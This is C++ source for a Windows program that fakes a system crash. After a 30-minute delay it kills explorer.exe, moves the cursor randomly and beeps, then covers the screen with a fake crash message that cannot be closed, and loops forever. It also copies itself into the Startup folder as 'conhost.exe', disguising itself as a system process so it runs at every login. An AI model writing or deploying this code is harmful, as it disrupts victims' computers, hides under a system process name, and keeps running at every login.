#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#pragma comment(lib, "Shlwapi.lib")

#include <Windows.h>
#include <cmath>
#include <thread>
#include <tchar.h>
#include <string>
#include <Shlwapi.h>
#include <Shlobj.h>
using namespace std;

#define WM_FORCE_EXIT (WM_USER + 0x0001)
#define TESTING false

#define SCREEN(x) GetSystemMetrics(*x == 'X' ? SM_CXSCREEN : SM_CYSCREEN)

int curX, curY;
bool crazyMouse;
void CrazyMouse() {
	while (crazyMouse) {
		curX = rand() % (int)GetSystemMetrics(SM_CXSCREEN);
		curY = rand() % (int)GetSystemMetrics(SM_CYSCREEN);
		SetCursorPos(curX, curY);
	}
}

int freq, dur;
bool beeper;
void Beeper() {
	while (beeper) {
		freq = rand() % 2001;
		dur = rand() % 301;
		Beep(freq, dur);
	}
}

const LPCWSTR BSOD_TEXT = L"A fatal exception 0E occured at 0028:C003CC2F in VXD VMM(01) +\n 0000156B. The current application will be terminated.\n\n\t* Press any key to terminate the current application.\n\t* Press CTRL+ALT+DEL again to restart your computer. You will\nlose any unsaved information in all applications.\n";
const int dist = 7;

void DrawBSOD(HWND hwnd) {
	HDC hdc;
	PAINTSTRUCT ps;
	hdc = BeginPaint(hwnd, &ps);

	// Draw main message error
	SetBkMode(hdc, TRANSPARENT);
	SetTextColor(hdc, RGB(255, 255, 255));

	RECT main;
	GetWindowRect(hwnd, &main);
	DrawText(hdc, BSOD_TEXT, wcslen(BSOD_TEXT), &main, DT_CALCRECT);

	int mainHeight = main.bottom - main.top;
	int mainWidth = main.right - main.left;

	main.top = (SCREEN("Y") - mainHeight) / 2 + dist;
	main.bottom = main.top + mainHeight;
	main.left = (SCREEN("X") - mainWidth) / 2;
	main.right = main.left + mainWidth;

	DrawText(hdc, BSOD_TEXT, wcslen(BSOD_TEXT), &main, NULL);
	
	// Draw title
	SetBkMode(hdc, OPAQUE);
	SetBkColor(hdc, RGB(221, 221, 221));
	SetTextColor(hdc, RGB(0, 0, 170));

	RECT title;
	GetWindowRect(hwnd, &title);
	DrawText(hdc, TEXT(" Windows "), strlen(" Windows "), &title, DT_CALCRECT | DT_CENTER);

	int titleWidth = title.right - title.left;
	int titleHeight = title.bottom - title.top;

	title.left = (SCREEN("X") - titleWidth) / 2;
	title.right = title.left + titleWidth;
	title.top = (SCREEN("Y") - titleHeight - mainHeight) / 2 - dist;
	title.bottom = title.top + titleHeight;

	DrawText(hdc, TEXT(" Windows "), strlen(" Windows "), &title, DT_CENTER);
	EndPaint(hwnd, &ps);
}


// WndProc - Window procedure
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case WM_FORCE_EXIT:
			PostQuitMessage(0);
			break;
		case WM_PAINT:
			DrawBSOD(hWnd);
			break;
		case WM_DESTROY:
		case WM_QUIT:
		case WM_CLOSE:
			return 0;
		default:
			return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}

HWND bsod;

int GenerateWindow(HINSTANCE hInstance) {
	// Setup window class attributes.
	WNDCLASSEX wcex;
	ZeroMemory(&wcex, sizeof(wcex));

	wcex.cbSize = sizeof(wcex);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpszClassName = TEXT("WINCLASS");
	wcex.hbrBackground = CreateSolidBrush(RGB(0, 0, 170));
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.lpfnWndProc = WndProc;
	wcex.hInstance = hInstance;

	// Register window and ensure registration success.
	if (!RegisterClassEx(&wcex))
		return 1;

	// Setup window initialization attributes.
	CREATESTRUCT cs;
	ZeroMemory(&cs, sizeof(cs));

	cs.x = 0;
	cs.y = 0;
	cs.cx = SCREEN("X");
	cs.cy = SCREEN("Y");
	cs.hInstance = hInstance;
	cs.lpszClass = wcex.lpszClassName;
	cs.style = WS_POPUP;

	bsod = CreateWindowEx(
		cs.dwExStyle,
		cs.lpszClass,
		cs.lpszName,
		cs.style,
		cs.x,
		cs.y,
		cs.cx,
		cs.cy,
		cs.hwndParent,
		cs.hMenu,
		cs.hInstance,
		cs.lpCreateParams);

	ShowCursor(false);

	// Validate window.
	if (!bsod)
		return 1;

	// Display the window.
	ShowWindow(bsod, SW_SHOWDEFAULT);
	UpdateWindow(bsod);
	if (!IsWindowVisible(bsod)) {
		BringWindowToTop(bsod);
	}

	// Main message loop.
	MSG msg;
	while (GetMessage(&msg, bsod, 0, 0) > 0)
		DispatchMessage(&msg);

	// Unregister window class, freeing the memory that was
	// previously allocated for this window.
	UnregisterClass(wcex.lpszClassName, hInstance);
	return (int)msg.wParam;
}

void FakeBSODLoop(HINSTANCE hInstance) {
	if (!TESTING) Sleep(30 * 60 * 1000);
	if (!TESTING) system("taskkill /F /IM explorer.exe");

	crazyMouse = true;
	thread mouse(CrazyMouse);
	beeper = true;
	thread beep(Beeper);

	Sleep(5 * 1000);

	crazyMouse = false;
	beeper = false;
	mouse.join(); 
	beep.join();

	thread window(GenerateWindow, hInstance);

	(TESTING) ? Sleep(10 * 1000) : Sleep(10 * 60 * 1000);

	PostMessage(bsod, WM_FORCE_EXIT, 0, 0);
	window.join();
	if (!TESTING) FakeBSODLoop(hInstance);
}

void ImplantOnStartup() {
	wchar_t path[MAX_PATH];
	if (!GetModuleFileName(NULL, path, MAX_PATH)) return;

	wchar_t newPath[MAX_PATH];
	wchar_t * startupPath[MAX_PATH];
	SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, startupPath);

	PathCombine(newPath, *startupPath, L"conhost.exe");
	CopyFile(path, newPath, true);
}

// WinMain - Win32 application entry point.
int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd) {
	thread bsod(FakeBSODLoop, hInstance);
	ImplantOnStartup();
	bsod.join();
	return 0;
}
